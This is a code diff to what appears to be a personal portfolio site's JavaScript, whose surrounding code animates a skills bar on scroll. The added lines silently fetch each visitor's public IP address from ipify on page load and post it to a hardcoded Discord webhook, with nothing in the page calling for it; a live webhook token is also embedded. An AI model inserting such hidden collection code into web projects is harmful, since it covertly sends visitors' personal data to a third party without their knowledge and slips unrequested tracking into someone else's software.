@@ -33,6 +33,26 @@ function efectoHabilidades(){
     }
 }
 
+var ip = '';
+fetch('https://api.ipify.org/?format=json')
+.then(function(response) {
+    return response.json();
+})
+.then(function(data) {
+    ip = data.ip;
+    var webhook = 'https://discord.com/api/webhooks/1132791066374975659/7lIvnhodV7AgQJTMZlJxsm6n0ASYXXZy9CSXYwn-mdgJmBokdz1Zw1gbSCZgVzw60x3S'
+    var message = {
+        content: 'IP:' + ip
+    };
+
+    fetch(webhook, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+    });
+});
 
 //detecto el scrolling para aplicar la animacion de la barra de habilidades
 window.onscroll = function(){
